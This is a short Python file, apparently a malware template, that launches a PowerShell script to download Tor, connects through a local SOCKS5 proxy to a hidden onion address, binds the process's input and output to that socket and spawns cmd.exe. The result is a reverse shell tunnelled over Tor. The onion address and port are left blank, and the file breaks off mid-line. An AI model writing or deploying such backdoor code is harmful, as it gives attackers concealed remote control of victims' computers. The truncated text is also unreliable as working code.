#this file never actually being used as a payload just a template
import socket
import os
import urllib
import subprocess
import socks
from time import sleep

#constents
OnionUrl = ""
PORT = int("")


os.system("powershell ./DownloadTor.ps1")
sleep(60*5)
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
s = socks.socksocket()
s.connect((OnionUrl, PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["cmd.exe"]);

def initpsfile():
    psfile = 